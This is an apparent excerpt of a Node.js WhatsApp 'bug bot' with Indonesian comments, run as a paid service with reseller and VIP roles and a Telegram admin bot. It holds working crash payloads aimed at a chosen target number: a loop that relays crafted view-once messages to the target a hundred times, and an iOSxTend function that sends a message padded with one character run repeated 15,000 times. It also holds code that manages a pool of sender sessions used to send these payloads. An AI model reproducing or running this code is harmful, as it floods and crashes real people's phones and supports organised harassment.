            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      for (let i = 0; i < 100; i++) {
      await sleep(1000);
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msgx.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      }
   } catch (err) {
      console.error(err);
   }
};

async function iOSxTend(sock, target) {
  const etc = await generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        text: "💤‼️⃟⃰ᰧ./### ✩ > https://Wa.me/stickerpack/RaldzzXyz" + "𑇂𑆵𑆴𑆿".repeat(15000),
        matchedText: "https://Wa.me/stickerpack/RaldzzXyz",
        description:
          "҉҈⃝⃞⃟⃠⃤꙰꙲" +
          "𑇂𑆵𑆴𑆿".repeat(15000),
        title:
          "💤‼️⃟⃰ᰧ./### ✩" +
          "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: null,
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      ephemeralExpiration: 5,
      timeStamp: Date.now(),
    }
  );

  await sock.relayMessage(target, etc.message, {
    messageId: etc.key.id,
  });
}

// ======================================= //
// WhatsApp Connect Logic
const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
const activeConnections = {};
const biz = {};   // Untuk WA Business
const mess = {};  // Untuk WA Messenger

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files; // ✅ Tambahkan return
  } catch (err) {
    console.error("Buat Folder 'permenmd' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    // 🛡️ FIX: folder tanpa creds.json valid dianggap bukan session WhatsApp,
    // jangan pernah dihitung sebagai Business/Messenger (penyebab hitungan 0/salah)
    if (!isValidBaileysCreds(creds)) return 'Unknown';
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`

      // 🛡️ Kalau creds.json hilang (mis. sempat terhapus), pulihkan dari snapshot:
      // - sender global : permenmd/global/<nama>.json
      // - sender user   : permenmd/<user>/<nama>.json
      const credsPath = path.join(sessionsFold, 'creds.json');
      if (!fs.existsSync(credsPath)) {
        const snapshots = [
          path.join(folderPath, `${sessionName}.json`),
          path.join(GLOBAL_SENDER_DIR, `${sessionName}.json`),
        ];
        for (const snap of snapshots) {
          if (fs.existsSync(snap)) {
            fs.mkdirSync(sessionsFold, { recursive: true });
            fs.copyFileSync(snap, credsPath);
            console.log(`[${sessionName}] creds.json dipulihkan dari snapshot ${snap}`);
            break;
          }
        }
      }

      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
  });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          delete activeConnections[sessionName];
          delete biz[sessionName];
          delete mess[sessionName];

          const credsFile = path.join(sessionsFold, 'creds.json');

          if (statusCode === 440) {
            // 440 = session digantikan device lain -> creds memang tidak berlaku lagi
            try { if (fs.existsSync(credsFile)) fs.rmSync(credsFile, { force: true }); } catch (_) {}
            resolve();
          } else if (!isLoggedOut && retries > 0) {
            // 🛡️ Putus sementara (515 restartRequired, timeout, dll):
            // creds TETAP disimpan, langsung reconnect — inilah penyebab sender
            // 'off setelah beberapa menit' sebelumnya (creds ikut terhapus)
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            // Logout sungguhan (loggedOut/403) atau habis retry -> creds dibuang
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            try { if (fs.existsSync(credsFile)) fs.rmSync(credsFile, { force: true }); } catch (_) {}
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}
async function connectNewUserSessionsOnly() {
  const userIdFolder = "permenmd";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    // Skip jika sudah ada koneksi aktif
    if (activeConnections[baseName]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    // Sambungkan sesi baru
    connectSession(sessionFolder, baseName);
  }
}

// Jika ingin refresh tanpa putus semua, pakai ini:
async function refreshUserSessions() {
  await startUserSessions();
  //startLoop();
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
      return false;
  }
  const sessionDir = path.join('permenmd', owner, number); 

  if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      activeConnections[number] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('permenmd', owner, `${number}.json`);

try {
  await waiting(3000)
  if (fs.existsSync(sourceCreds)) {
    const data = fs.readFileSync(sourceCreds); // baca isi file sumber
    fs.writeFileSync(destCreds, data); // tulis ulang (overwrite)
    console.log(`✅ Rewrote session to ${destCreds}`);
  }
} catch (e) {
  console.error(`❌ Failed to rewrite creds: ${e.message}`);
}
    }
  });

  return null;
}


// ======================================= //
// ===== SENDER GLOBAL SYSTEM =====
// ======================================= //
// Folder khusus sender global: permenmd/global
// - Upload creds.json via Telegram (owner) -> otomatis connect & masuk daftar sender global
// - Dipakai untuk /sendBug bagi user ber-role vip, owner, reseller, admin
// - Nomor sender global di-sensor (628xxxxxx12 -> 628•••••12)
const GLOBAL_SENDER_DIR = path.join('permenmd', 'global');
const GLOBAL_ALLOWED_ROLES = ['vip', 'owner', 'reseller', 'admin', 'reseller1'];

function maskNumber(num) {
  const s = String(num || '');
  if (s.length <= 6) return '•••••';
  return s.slice(0, 3) + '•••••' + s.slice(-2);
}

function canUseGlobalSender(user) {
  return GLOBAL_ALLOWED_ROLES.includes((user?.role || 'member').toLowerCase());
}

function getGlobalSenderFolder() {
  try {
    if (!fs.existsSync(GLOBAL_SENDER_DIR)) fs.mkdirSync(GLOBAL_SENDER_DIR, { recursive: true });
    return fs.readdirSync(GLOBAL_SENDER_DIR)
      .filter(f => f.endsWith('.json'))
      .map(f => path.basename(f, '.json'));
  } catch (_) {
    return [];
  }
}

// Sambungkan semua creds di folder global yang belum aktif
async function connectGlobalSenders() {
  const names = getGlobalSenderFolder();
  if (!names.length) return;

  console.log(`[🌐 GLOBAL] Ditemukan ${names.length} sender global, menyambungkan...`);

  await Promise.all(names.map(async (name) => {
    if (activeConnections[name]) return;

    // Validasi creds dulu
    try {
      const creds = JSON.parse(fs.readFileSync(path.join(GLOBAL_SENDER_DIR, `${name}.json`), 'utf8'));
      if (!isValidBaileysCreds(creds)) {
        console.log(`[🌐 GLOBAL] ${maskNumber(name)} bukan creds valid, dilewati.`);
        return;
      }
    } catch (_) {
      return;
    }

    try {
      // Pastikan folder session berisi creds.json terbaru
      const sessDir = path.join(GLOBAL_SENDER_DIR, name);
      if (!fs.existsSync(sessDir)) fs.mkdirSync(sessDir, { recursive: true });
      fs.copyFileSync(
        path.join(GLOBAL_SENDER_DIR, `${name}.json`),
        path.join(sessDir, 'creds.json')
      );
      await connectSession(sessDir, name);
    } catch (err) {
      console.warn(`[🌐 GLOBAL] Gagal connect sender global ${maskNumber(name)}:`, err.message);
    }
  }));

  const online = Object.keys(activeConnections).filter(n => names.includes(n));
  console.log(`[🌐 GLOBAL] Sender global online: ${online.length ? online.map(maskNumber).join(', ') : 'tidak ada'}`);
}

// 🌐 Reconnect pairing sender global (dipakai saat koneksi putus, maks 5 percobaan)
async function pairingGlobalSender(num, attempt = 1) {
  if (attempt >= 5) return false;

  const sessDir = path.join(GLOBAL_SENDER_DIR, num);
  if (!fs.existsSync(sessDir)) return false;

  const { state, saveCreds } = await useMultiFileAuthState(sessDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    version: version,
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 [GLOBAL] Reconnecting ${maskNumber(num)} karena ${lastDisconnect?.error?.output?.statusCode} (percobaan ${attempt}/5)`);
        await waiting(3000);
        await pairingGlobalSender(num, attempt + 1);
      } else {
        delete activeConnections[num];
        delete biz[num];
        delete mess[num];
        // Logout sungguhan -> buang creds agar tidak dicoba terus saat boot
        try { fs.rmSync(path.join(sessDir, 'creds.json'), { force: true }); } catch (_) {}
      }
    } else if (connection === "open") {
      activeConnections[num] = sock;
      biz[num] = sock;
      mess[num] = sock;

      // Sinkronkan snapshot creds ke file <nomor>.json
      try {
        await waiting(3000);
        const sourceCreds = path.join(sessDir, 'creds.json');
        if (fs.existsSync(sourceCreds)) {
          fs.copyFileSync(sourceCreds, path.join(GLOBAL_SENDER_DIR, `${num}.json`));
        }
      } catch (_) {}

      console.log(`[🌐 GLOBAL] Sender global ${maskNumber(num)} kembali online.`);
    }
  });

  return null;
}

async function startUserSessions() {
  // 🌐 Sambungkan sender global dulu
  await connectGlobalSenders();

  // Ambil semua subfolder dalam permenmd
  const subfolders = fs.readdirSync('permenmd')
    .map(name => path.join('permenmd', name))
    .filter(p => fs.lstatSync(p).isDirectory());

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);

  // 🛡️ FIX: connect paralel dengan Promise.all (dulu await berurutan,
  // membuat sesi selanjutnya baru mulai setelah yang sebelumnya resolve)
  await Promise.all(subfolders.map(async (folder) => {
    const jsonFiles = fs.readdirSync(folder)
      .filter(file => file.endsWith(".json"))
      .map(file => path.join(folder, file));

    console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

    await Promise.all(jsonFiles.map(async (jsonFile) => {
      const sessionName = `${path.basename(jsonFile, ".json")}`;

      // Validasi creds dulu — file bukan creds Baileys dilewati
      try {
        if (!isValidBaileysCreds(JSON.parse(fs.readFileSync(jsonFile, 'utf8')))) {
          console.log(`[SKIP] ${sessionName} bukan creds Baileys valid, dilewati.`);
          return;
        }
      } catch (_) {
        console.log(`[SKIP] ${sessionName} gagal dibaca, dilewati.`);
        return;
      }

      // ✅ Cek apakah session sudah aktif
      if (activeConnections[sessionName]) {
        console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
        return;
      }

      try {
        console.log(`[START] Connecting session: ${sessionName}`);
        await connectSession(folder, sessionName);
      } catch (err) {
        console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
      }
    }));
  }));
}

// === Fungsi untuk mengecek apakah folder punya sesi aktif ===
function checkActiveSessionInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      return activeConnections[sessionName]; // return socket aktif
    }
  }
  return null; // Tidak ada sesi aktif
}

// === Pilih sender: global utk role terbatas, personal utk member biasa ===
// preferGlobal=false -> langsung pakai sender pribadi
function pickSenderForUser(user, preferGlobal = true) {
  if (preferGlobal && canUseGlobalSender(user)) {
    const globalNames = getGlobalSenderFolder();
    const onlineGlobal = globalNames.filter(n => activeConnections[n]);
    if (onlineGlobal.length > 0) {
      const pick = onlineGlobal[Math.floor(Math.random() * onlineGlobal.length)];
      return { sock: activeConnections[pick], senderName: pick, isGlobal: true };
    }
  }
  // Member biasa (atau global offline) -> sender milik sendiri
  const ownSock = checkActiveSessionInFolder(user.username);
  return { sock: ownSock, senderName: user.username, isGlobal: false };
}

// Endpoint: daftar sender global (nomor di-sensor) — khusus role premium
// 🌐 Pairing sender global via nomor (alur sama seperti sender pribadi):
// masukkan nomor -> dapat kode pairing -> masukkan di WhatsApp -> otomatis connect
// Hanya owner/admin (panel role) yang boleh memasangkan sender global.
app.get("/getGlobalPairing", async (req, res) => {
  const { key, number } = req.query;
  const user = getUserBySessionKey(key);
  if (!user) return res.json({ valid: false, message: "Invalid key" });

  if (!canManageGlobalSender(user)) {
    return res.json({ valid: true, authorized: false, message: "Hanya owner/admin yang bisa menambah sender global." });
  }

  if (!number) return res.status(400).json({ error: "Number is required" });
  const num = String(number).replace(/\D/g, "");
  if (!num) return res.status(400).json({ error: "Number is required" });

  try {
    const sessDir = path.join(GLOBAL_SENDER_DIR, num);
    if (!fs.existsSync(GLOBAL_SENDER_DIR)) fs.mkdirSync(GLOBAL_SENDER_DIR, { recursive: true });
    if (!fs.existsSync(sessDir)) fs.mkdirSync(sessDir, { recursive: true });

    // Kalau sender ini sudah terdaftar & online, tidak perlu pairing ulang
    if (activeConnections[num]) {
      return res.json({ valid: true, alreadyPaired: true, number: maskNumber(num), message: "Sender sudah terhubung." });
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === "close") {
        const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
        if (!isLoggedOut) {
          console.log(`🔄 [GLOBAL] Reconnecting ${maskNumber(num)}...`);
          await waiting(3000);
          await pairingGlobalSender(num, 1);
        } else {
          delete activeConnections[num];
          delete biz[num];
          delete mess[num];
        }
      } else if (connection === "open") {
        activeConnections[num] = sock;
        biz[num] = sock;
        mess[num] = sock;

        // Simpan snapshot creds ke file <nomor>.json (pola yang sama dengan pairingWa)
        try {
          await waiting(3000);
          const sourceCreds = path.join(sessDir, 'creds.json');
          if (fs.existsSync(sourceCreds)) {
            fs.copyFileSync(sourceCreds, path.join(GLOBAL_SENDER_DIR, `${num}.json`));
          }
        } catch (e) {
          console.error(`[🌐 GLOBAL] Gagal simpan creds ${maskNumber(num)}: ${e.message}`);
        }

        console.log(`[🌐 GLOBAL] Sender global ${maskNumber(num)} berhasil dipasangkan & online.`);
      }
    });

    if (!sock.authState.creds.registered) {
      await waiting(1000);
      const code = await sock.requestPairingCode(num);
      if (code) {
        return res.json({ valid: true, number: maskNumber(num), pairingCode: code });
      }
      return res.json({ valid: false, message: "Gagal membuat pairing code / nomor sudah terdaftar." });
    }

    return res.json({ valid: true, alreadyPaired: true, number: maskNumber(num), message: "Nomor sudah pernah dipasangkan." });
  } catch (err) {
    console.error("[❌ GLOBAL PAIRING]", err.message);
    return res.status(500).json({ error: err.message });
  }
});
app.get("/globalSenders", (req, res) => {
  const keyInfo = activeKeys[req.query.key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, message: "User not found" });

  const role = user.role || "member";

  if (!canUseGlobalSender(user)) {
    return res.json({
      valid: true,
      authorized: false,
      canUse: false,
      canManage: canManageGlobalSender(user),
      role,
      username: user.username,
      message: "Sender global hanya tersedia untuk VIP, Owner, Reseller, dan Admin.",
      senders: [],
      total: 0,
      onlineCount: 0
    });
  }

  const names = getGlobalSenderFolder();
  const senders = names.map((name) => ({
    number: maskNumber(name),
    online: !!activeConnections[name]
  }));

  return res.json({
    valid: true,
    authorized: true,
    canUse: true,
    canManage: canManageGlobalSender(user),
    role,
    username: user.username,
    senders,
    total: senders.length,
    onlineCount: senders.filter(s => s.online).length
  });
});


const telegramDataPath = "telegram.json";
const dbPath = "database.json";

// ===== Helpers =====
function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], userList: [] }, null, 2));
  return JSON.parse(fs.readFileSync(telegramDataPath));
}

function loadDatabase() {
  if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify([]));
  return JSON.parse(fs.readFileSync(dbPath));
}

function saveDatabase(data) {
  fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
}

function generateKey() {
  return crypto.randomBytes(8).toString("hex");
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}


function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

// ===== Command Handlers =====
bot.onText(/^\/?(start|menu)/, (msg) => {
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.sendMessage(id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🆕 Buat Akun Member", callback_data: "create_member" }],
        [{ text: "⏳ Set Expired", callback_data: "set_expire" }],
        ...(isOwner ? [[
          { text: "📋 List User", callback_data: "list_user" },
          { text: "🎛 Buat Custom User", callback_data: "create_custom" },
          { text: "🗑 Hapus User", callback_data: "delete_user" }
        ]] : [])
      ]
    }
  };

  bot.sendMessage(id, `👋 Halo ${msg.from.first_name}, pilih menu:`, options);
});
bot.on('message', async (msg) => {
